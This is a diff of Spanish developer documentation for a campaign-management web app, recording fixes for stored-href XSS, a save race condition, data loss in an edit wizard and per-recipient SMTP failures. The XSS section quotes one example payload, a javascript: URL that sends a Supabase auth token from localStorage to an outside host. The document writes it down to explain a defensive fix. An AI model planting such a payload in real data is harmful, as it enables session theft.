@@ -118,6 +118,26 @@ ella se gestiona el equipo. Ojo: un `<script>` inyectado por innerHTML no corre,
 así que cubre lo que ya está guardado sin migrar nada. `htmlAText` (`campaignMarkdown.ts`) usa
 `DOMParser`, que es inerte — ahí no hace falta.
 
+### XSS — el otro camino: `href={...}`
+**DOMPurify no cubre los `href` de JSX**, porque ahí no hay HTML que sanear: React escribe el
+atributo tal cual llegue. Y **React 18 no filtra `javascript:` en producción** — la comprobación
+existe solo en `react-dom.development.js` como un `console.error`; en el bundle de producción el
+string ni siquiera aparece (React 19 sí lo bloquea, pero estamos en 18.3). Un
+`javascript:fetch('https://…?s='+localStorage.getItem('sb-…-auth-token'))` guardado como "URL del
+entregable" o "Link del segmento" se ejecutaba con la sesión de quien lo clicara.
+
+**Toda URL que salga de datos guardados pasa por `esUrlHttp`/`hrefSeguro` de `src/lib/urlSegura.ts`**
+(solo http/https, validando con `new URL()` y no con regex: el parser del navegador ya se come
+`java\nscript:`, los espacios y los control characters). Se aplica **en lectura**, igual que
+DOMPurify. Cuando el valor no pasa, el texto **se sigue mostrando** pero no como enlace — esconder
+el dato confundiría más. Los tres sitios eran `DeliverableSummary` (entregable tipo URL),
+`FactoryPage` (`segmentLink`) y `WebinarsPage` (`w.link`, **el único dato que se pinta sin haber
+pasado nunca por nuestra base**: viene del webhook de n8n).
+
+Las dos copias sueltas de `isValidUrl` (`StrategyBriefPanels`, `BitlyLinkTool`) delegan ahí: si
+algún día se relaja la validación, no puede quedar una mitad por detrás. Los `href` de adjuntos
+(`a.url`, `attachment.url`) no pasan por acá porque salen de `getPublicUrl` de storage.
+
 ---
 
 ## Dónde vive cada cosa
@@ -196,6 +216,18 @@ El hook **`useCampanasFrescas`** (las 3 vistas que leen campañas: La Fábrica, 
 hace la carga inicial y **relee al volver a la pestaña** — es lo que evita llegar al conflicto. No
 relee si hay una escritura propia pendiente (`haySincronizacionPendiente()`).
 
+**`pendingSync` NO alcanza para saber si hay algo pendiente: hay que mirar también
+`escriturasEnVuelo`.** `pendingSync` solo guarda el temporizador del debounce y se vacía **en la
+primera línea del callback**, o sea justo *antes* de las dos llamadas de red. Eso dejaba una ventana
+ciega de medio segundo a dos segundos (leer la revisión + subir el blob, que puede pesar megas) en
+la que `haySincronizacionPendiente()` mentía. Un `focus` ahí —volver a la ventana tras mirar otra
+cosa: lo más normal del mundo— disparaba `hydrate()`, que traía la fila **todavía vieja** y pisaba
+el store: el cambio desaparecía de la pantalla y, si la persona volvía a tocar algo, ese guardado
+salía de la copia vieja y **lo borraba también de la base**, sin error y sin aviso. Por eso el
+guardado vive en `escribirProyecto` (aparte, para que el `finally` cubra los `return` tempranos) y
+`hydrate` **se salta las campañas en vuelo** —ni su fila ni su `revisionConocida`—, que si no el
+guardado siguiente veía un falso conflicto.
+
 ### Números y códigos
 - `FactoryProject.numero` (`#7`) = **máx + 1, no `length + 1`**: borrar la campaña del medio no
   recicla su número. Se calcula en el cliente, así que dos campañas creadas a la vez podían
@@ -210,12 +242,39 @@ relee si hay una escritura propia pendiente (`haySincronizacionPendiente()`).
   (C1 → C7 → C13). Se recupera por **texto + rol**, emparejando de a uno con `shift` para que dos
   tareas del mismo nombre no se lleven el mismo.
 
-### ⚠️ Riesgo abierto: el wizard de edición reconstruye todo
-`buildFabricaBriefs` (`CreateProjectWizard`) rearma `fabricaBriefs` **completo, con ids nuevos**, en
-cada guardado. En teoría, editar una campaña ya avanzada puede perder `deliverableContent`,
-`comments`, `workflowStatus` y `currentNodeId` de entregables que ya pasaron por el flujo. **No está
-confirmado que haya pasado en producción.** Arreglarlo bien es pasar a diff/merge en vez de
-reemplazo. Preguntar antes de invertir en eso.
+### El wizard de edición reconstruye todo — y por eso hay `fusionarBriefs` (RESUELTO 2026-07-30)
+`buildFabricaBriefs` (`CreateProjectWizard`) rearma `fabricaBriefs` **completo, con ids nuevos y en
+blanco**, y el `useEffect` que lo llama corre **ya al abrir el diálogo** (deps: canales, loops,
+requerimientos, formularioConfig). Esto no era un riesgo teórico: **cada "Guardar cambios", aunque
+no se tocara un campo, reemplazaba la lista entera** y se llevaba `deliverableContent`, los
+adjuntos, el hilo de `comments` con todo el historial de aprobación, `workflowStatus`, las métricas
+y **todas las tareas que no nacen del wizard** (las de `activateNextStage`, el quick-add de los
+nodos, las de métricas). Como cada escritura reemplaza el blob, no había forma de recuperarlo.
+Medido con la prueba de regresión: una campaña de 6 tareas quedaba en 4, todas vacías.
+
+Hoy `updateProject` pasa por **`fusionarBriefs`** (`factoryStore`), que:
+1. empareja por **`texto + rol`**, de a una (`shift`), para que dos tareas homónimas no compartan
+   pareja;
+2. a la emparejada le devuelve **su `id`** —`sourceBriefId` referencia POR ID, y con uno nuevo la
+   pestaña "Paso anterior" deja de encontrar su origen— y todos los `CAMPOS_DE_TRABAJO`;
+3. conserva las que quedan sin pareja, **salvo** que las hubiera generado el wizard
+   (`origen: 'wizard'`) **y** estén vacías (`tieneTrabajo`).
+
+**`FabricaBriefItem.origen` es la pieza clave.** Solo `buildFabricaBriefs` lo pone. Sin marca —lo
+que nació en el flujo **y todo lo legado**— una tarea no se descarta nunca, porque el wizard no
+sabría regenerarla. Es conservador a propósito y se autocorrige: tras el primer guardado, todo lo
+del plan queda marcado.
+
+**Efecto de borde asumido:** cambiarle la fecha o el segmento a un canal cambia el *texto* de su
+tarea, así que no empareja. Si ya tenía trabajo quedan **las dos** (la vieja con su contenido, la
+nueva vacía) y hay que borrar la que sobra con "Eliminar tarea". Es la decisión correcta: un
+duplicado se ve y se arregla; un entregable borrado en silencio, no.
+
+`limpiarNodosMuertos` completa el arreglo: al quitar un canal, `syncCanalNodes` borra el nodo y las
+tareas rescatadas quedaban con un `currentNodeId` colgando — invisibles en Flujo de trabajo
+(`briefsForNode` no las halla en ningún nodo) pero contando en "Mis tareas" y Reportes, **sin forma
+de abrirlas ni de borrarlas**. Se les pone `currentNodeId: null` y vuelven a caer en las heurísticas
+por rol/texto.
 
 ---
 
@@ -308,6 +367,16 @@ se corrige después se ve corregido).
 - **Se manda un correo por destinatario**, no uno con todos en el `to`: el directorio tiene correos
   personales y no tienen por qué verse entre ellos. Tope de una cuenta Gmail gratuita: ~500/día, y
   el sistema manda **un correo por rol, no por tarea**.
+- **Cada destinatario va en su propio `try`, y eso NO es cosmético.** El `try` envolvía el bucle
+  entero, así que un solo rechazo —una dirección del directorio que Gmail no acepta (se escriben a
+  mano) o la cuota diaria agotándose a mitad de la lista— abortaba el resto: **los que venían
+  después no recibían nada**. Y no lo notaba nadie: notificar es fire-and-forget y el único rastro
+  era un `console.warn` en el navegador de quien disparó la acción, que no es ninguno de los que se
+  quedaron sin correo. Hoy un fallo recuperable se anota, se manda `RSET` (un RCPT rechazado deja el
+  `MAIL FROM` abierto) y se sigue; solo `conexionPerdida` corta el envío. La función responde
+  `parcial: true` con la lista de `fallidos` y loguea **`ENVIO_PARCIAL`** — ese log es lo único que
+  permite enterarse de que a alguien dejaron de llegarle los avisos. `destinatarios` cuenta los que
+  **salieron**, no los previstos (antes reportaba el total aunque no hubiera salido casi ninguno).
 
 **Regla de oro del lado del navegador:** el cliente **NUNCA manda direcciones de correo**. Solo dice
 qué pasó, en qué campaña, sobre qué tareas y qué **rol** es responsable; la función resuelve los
@@ -473,12 +542,38 @@ build).
   y stubbear el cliente de Supabase que abrir un navegador. **Los stubs tienen que quedar
   `external`**: si esbuild los inlinea, la prueba y el código terminan con dos copias del módulo (y
   de la base de mentira) y todo falla por la razón equivocada.
+- **Trampas de ese montaje** (costaron tiempo el 2026-07-30):
+  - Un `path` que devuelve un plugin de esbuild tiene que ser **exacto**: ya no se le aplica
+    `resolveExtensions`, así que el alias `@/…` hay que resolverlo a mano probando `.ts`/`.tsx`.
+  - El stub externo se declara con ruta **relativa** (`./stub-x.mjs`) y el bundle se emite **en la
+    misma carpeta**; con ruta absoluta de Windows, node no la importa.
+  - Si la carpeta de pruebas tiene `package.json` (lo deja `npm init`), hay que ponerle
+    `"type": "module"` o los bundles `.js` se cargan como CommonJS y revientan.
+  - Las **edge functions** también se pueden probar así: un plugin que mande todo `https://…` a un
+    stub (`serve` captura el handler, `createClient` devuelve un directorio falso) y un
+    `globalThis.Deno` con `env.get` y `connectTls`. Con un socket de mentira que hable SMTP de
+    verdad se prueba el diálogo completo sin tocar Gmail.
+- **La prueba de regresión hay que verla FALLAR con el código anterior.** Se hace cambiando el
+  archivo por `git show HEAD:<ruta>`, reconstruyendo y corriendo: si pasa igual, la prueba no está
+  probando nada. Las cuatro de la revisión del 2026-07-30 se comprobaron así.
 
 ---
 
 ## Historial reciente
 
 Solo lo que sigue explicando el estado actual. Lo anterior está en el historial de git.
+
+- **2026-07-30 (v1.11.0) — revisión de bugs.** Cuatro arreglos, todos con prueba de regresión que
+  se comprobó que **falla** con el código anterior:
+  1. **El wizard de edición ya no borra el trabajo de los entregables** (`fusionarBriefs` +
+     `FabricaBriefItem.origen` + `limpiarNodosMuertos`). Era pérdida de datos irreversible en cada
+     "Guardar cambios".
+  2. **La carrera entre `hydrate()` y una escritura en vuelo** (`escriturasEnVuelo`): revertía el
+     cambio en pantalla y podía borrarlo también de la base.
+  3. **`javascript:` en los `href`** guardados (`src/lib/urlSegura.ts`), el hueco que DOMPurify no
+     tapaba.
+  4. **Un destinatario rechazado ya no apaga el correo del resto del rol** (bucle SMTP por
+     destinatario + `ENVIO_PARCIAL`).
 
 - **2026-07-29 (v1.10.0)** — se eliminó el kanban viejo completo (~3.700 líneas, ver "Otros detalles
   que muerden") y se agregó **"Eliminar tarea"** en el diálogo de la tarea: antes no había ninguna
@@ -591,9 +686,11 @@ contra producción**. Lo que sigue son decisiones y tareas de cuenta, no desplie
       que revisarlas a mano.
 - [ ] Confirmar a mano el **round-trip de "Editar proyecto"** del ecosistema cíclico (etapas, ELMR,
       motor, `etapaId`/`siguienteEtapaId`): se creó y se vio en la misma sesión, no se reabrió.
-- [ ] Probar **quitar un canal ya guardado** (desmarcar BTL/KAM/Call Center en "Editar proyecto") y
-      confirmar que `syncCanalNodes` borra su nodo. La lógica es simétrica a
-      `syncRequerimientoNodes` (ya probada) pero no se ejercitó.
+      (Las **tareas** de ese round-trip ya están cubiertas por las pruebas de `fusionarBriefs`; lo
+      que falta es el resto del blob.)
+- [x] **Quitar un canal ya guardado** — cubierto por prueba (2026-07-30): `syncCanalNodes` borra su
+      nodo, las tareas vacías de ese canal se descartan, las que tenían trabajo se conservan y
+      `limpiarNodosMuertos` les quita el `currentNodeId` colgando.
 - [ ] Confirmar **CORS** en los 2 webhooks n8n que se usan (`crearlink`, `descargar-qr`) y probar
       `BitlyLinkTool` contra n8n real (solo se verificó con mocks). Para el nombre del archivo del
       QR hace falta además `Access-Control-Expose-Headers: Content-Disposition`.
